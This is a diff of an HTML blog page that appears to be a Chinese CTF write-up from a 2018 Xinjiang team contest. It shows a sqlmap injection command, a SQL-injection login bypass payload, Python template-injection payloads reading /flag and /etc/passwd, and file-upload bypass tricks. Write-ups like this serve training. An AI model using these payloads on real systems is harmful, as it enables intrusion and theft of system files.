@@ -27,6 +27,7 @@
 <meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/sql1.png">
 <meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/sql2.png">
 <meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/sql3.png">
+<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/sql5.png">
 <meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/p.png">
 <meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/p1.png">
 <meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/p2.png">
@@ -42,7 +43,7 @@
 <meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/qu3.png">
 <meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/base.png">
 <meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/story.png">
-<meta property="og:updated_time" content="2018-09-13T09:22:00.484Z">
+<meta property="og:updated_time" content="2018-09-14T05:52:52.028Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="首届新疆网络安全知识技能竞赛(团体赛)">
 <meta name="twitter:description" content="前言第一天经历了个人解题晋级赛之后，第二天就是团体的解题赛，这一天管理相对第一天比较严一些，进行手机的提交要求，第一天虽然也提交了，明显还是有人使用手机开了热点。这一天的刷题还算是比较顺利，web题目就一道大家都没有解出来之外，其他的也全部搞定。 团体解题晋级赛有了第一天的经历之后，这次相对的把自己的节奏和心态都稍微的进行调整，解题中相对还算是比较顺利，两个队伍都挺进了决赛。 Web reveng">
@@ -237,18 +238,18 @@
       <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一天经历了个人解题晋级赛之后，第二天就是团体的解题赛，这一天管理相对第一天比较严一些，进行手机的提交要求，第一天虽然也提交了，明显还是有人使用手机开了热点。这一天的刷题还算是比较顺利，web题目就一道大家都没有解出来之外，其他的也全部搞定。<br><img src="score.png" alt=""></p>
 <h2 id="团体解题晋级赛"><a href="#团体解题晋级赛" class="headerlink" title="团体解题晋级赛"></a>团体解题晋级赛</h2><p>有了第一天的经历之后，这次相对的把自己的节奏和心态都稍微的进行调整，解题中相对还算是比较顺利，两个队伍都挺进了决赛。</p>
 <h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a><h2>Web</h2></h3><ul>
-<li><strong>revenge_of_sql</strong><br>sql的复仇，应该是和sql注入有关，首先进行敏感目录扫描，发现.git源码泄露<br>直接githack  发现 index.php文件存在  过滤空格的盲注注入，直接sqlmap 跑数据库但是发现没有<br><img src="sql1.png" alt="sql"><br>sqlmap -r 1.txt –random-agent –dbms=mysql –tamper=space2comment.py -v 3 –sql-shell <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sql1</span><br></pre></td></tr></table></figure>
+<li><strong>revenge_of_sql</strong><br>sql的复仇，应该是和sql注入有关，首先进行敏感目录扫描，发现.git源码泄露<br>直接githack  发现 index.php文件存在  过滤空格的盲注注入，直接sqlmap 跑数据库但是发现没有<br><img src="sql1.png" alt="sql"><br>sqlmap -r 1.txt –random-agent –dbms=mysql –tamper=space2comment.py -v 3 –sql-shell <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sql1</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p>admin xman  登录进入 和源码的逻辑相同没有显示<br><img src="sql2.png" alt="sql"><br>也可以手工注入登录<br><code>Username=&#39;/**/union/**/select(&#39;202cb962ac59075b964b07152d234b70&#39;)#&amp;password=123</code><br>最后分析一下git历史信息</p>
-<p><img src="sql3.png" alt="sql"><br>发现有flag22222.php<br>使用sqlmap 跑一下</p>
+<p><img src="sql3.png" alt="sql"><br>发现有flag22222.php<br>使用sqlmap 跑一下<br><img src="sql5.png" alt="sql"></p>
 <ul>
-<li><strong>Web baby python</strong><br>没有啥思路，直接爆破url参数<br><img src="p.png" alt="python"><br>发现出现花括号 会出现信息的不完整输出，那应该明确了考点，就是python web的模板注入，可以直接使用函数读文件<br>也可以使用其他python 沙盒绕过<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&apos;/flag&apos;).read() &#125;&#125;` 等python链进行代码的执行</span><br><span class="line">http://10.98.98.25:5554/404?msg=&apos;&#125;&#125;&#123;&#123; open(&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+<li><strong>Web baby python</strong><br>没有啥思路，直接爆破url参数<br><img src="p.png" alt="python"><br>发现出现花括号 会出现信息的不完整输出，那应该明确了考点，就是python web的模板注入，可以直接使用函数读文件<br>也可以使用其他python 沙盒绕过<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&apos;/flag&apos;).read() &#125;&#125;等python链进行代码的执行</span><br><span class="line">http://10.98.98.25:5554/404?msg=&apos;&#125;&#125;&#123;&#123; open(&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><img src="p1.png" alt="python"><br><img src="p2.png" alt="python"></p>
 <ul>
-<li><strong>ezupload</strong><br>文件上传常规套路：直接大小写 javascript  改后缀 截断</li>
+<li><strong>ezupload</strong><br>文件上传常规套路：直接大小写、javascript、 改后缀 、截断或这让js失效</li>
 </ul>
 <p><img src="upload.png" alt="upload"><br><img src="upload1.png" alt="upload"></p>
 <ul>
